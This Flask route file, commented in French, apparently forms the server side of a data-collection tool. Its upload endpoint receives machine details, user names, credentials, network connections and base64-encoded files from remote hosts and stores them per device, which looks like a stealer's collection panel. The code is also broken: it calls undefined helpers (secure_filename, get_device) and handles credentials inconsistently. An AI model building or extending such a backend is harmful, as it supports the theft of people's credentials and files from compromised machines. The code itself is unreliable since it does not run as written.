from flask import Blueprint, render_template, request, jsonify, current_app
from .models import db, Device, Credential, File, Network
import base64, os, uuid
import services

main = Blueprint("main", __name__)

@main.route("/")
def index():
    devices = Device.query.all()
    return render_template("index.html", devices=devices)


@main.route("/device/<int:device_id>")
def device(device_id):
    device = Device.query.get_or_404(device_id)
    return render_template("device.html", device=device)


@main.route("/api/upload", methods=["POST"])
def upload():

    data = request.get_json()

    existing_device =  get_device(data.get("os"),data.get("hostname"),data.get("user"))
    if existing_device==None:
        #creer l'objet dans la bdd
        


        device = Device(
            hostname=data.get("hostname"),
            ip=data.get("ip"),
            os=data.get("os"),
            user=data.get("user"),
            hardware= data.get("hardware",""),
            software = data.get("software",""),
            credentials=data.get("credentials","")
        )

        db.session.add(device)
        db.session.commit()

        for cred in data.get("credentials", []):
            db.session.add(Credential(data=cred, device=device))

        for net in data.get("network", []):
            db.session.add(Network(connection=net, device=device))


        for f in data.get("files", []):

            original_name = secure_filename(f["filename"])
            filename = f"{uuid.uuid4()}_{original_name}"

            try:
                file_bytes = base64.b64decode(f["data"], validate=True)
            except Exception:
                return {"error": "invalid base64"}, 400

            upload_folder = current_app.config["UPLOAD_FOLDER"]
            os.makedirs(upload_folder, exist_ok=True)

            filepath = os.path.join(upload_folder, filename)

            try:
                with open(filepath, "wb") as file:
                    file.write(file_bytes)

                db.session.add(File(
                    filename=filename,
                    path=filepath,
                    device=device
                ))

                db.session.commit()

            except Exception:
                db.session.rollback()

                if os.path.exists(filepath):
                    os.remove(filepath)

                raise

        db.session.commit()
    else:
        #mettre a jour la bdd
    
        device = existing_device

        # Mise à jour des champs simples
        device.ip = data.get("ip", device.ip)
        device.hardware = data.get("hardware", device.hardware)
        device.software = data.get("software", device.software)

        # Ajouter uniquement les nouvelles connexions réseau
        existing_networks = {n.connection for n in device.networks}

        for net in data.get("network", []):
            if net not in existing_networks:
                db.session.add(
                    Network(connection=net, device=device)
                )

        db.session.commit()

    return jsonify({"status": "ok"})